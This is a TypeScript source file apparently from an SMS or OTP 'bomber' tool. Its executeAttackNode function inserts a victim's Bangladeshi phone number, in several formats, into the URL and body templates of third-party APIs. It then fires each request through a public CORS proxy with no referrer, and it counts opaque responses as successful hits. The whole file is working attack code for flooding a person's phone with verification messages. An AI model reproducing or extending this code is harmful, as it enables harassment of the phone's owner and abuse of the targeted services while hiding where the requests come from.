import { ApiNode } from '../types';

export const executeAttackNode = async (
    node: ApiNode, 
    phone: string, 
    signal: AbortSignal,
    proxyUrl: string = "https://corsproxy.io/?"
): Promise<{ ok: boolean, status: number, error?: string }> => {
    
    const raw = phone.replace(/^(\+88|88)/, ''); 
    const p88 = `88${raw}`; 
    const pp88 = `+88${raw}`; 

    // Replace placeholders
    let body = node.body
      .replace(/{phone}/g, raw)
      .replace(/{phone_88}/g, p88)
      .replace(/{phone_p88}/g, pp88);
    
    let url = node.url
      .replace(/{phone}/g, raw)
      .replace(/{phone_88}/g, p88)
      .replace(/{phone_p88}/g, pp88);

    let headers = {};
    try { headers = JSON.parse(node.headers); } catch (e) { }

    const isGet = node.method === 'GET';

    try {
        // Use the dynamic proxyUrl passed from the engine configuration
        const encodedTarget = encodeURIComponent(url);
        const finalUrl = `${proxyUrl}${encodedTarget}`;

        const response = await fetch(finalUrl, {
            method: node.method,
            headers: headers,
            body: !isGet ? body : undefined,
            signal,
            cache: 'no-store',
            referrerPolicy: 'no-referrer'
        });
        
        if (response.type === 'opaque') {
            return { ok: true, status: 0 };
        }
        
        return { 
            ok: response.ok, 
            status: response.status 
        };
    } catch (e: any) {
        if (e.name === 'AbortError') throw e;
        return { 
            ok: false, 
            status: -1, 
            error: e.message 
        };
    }
};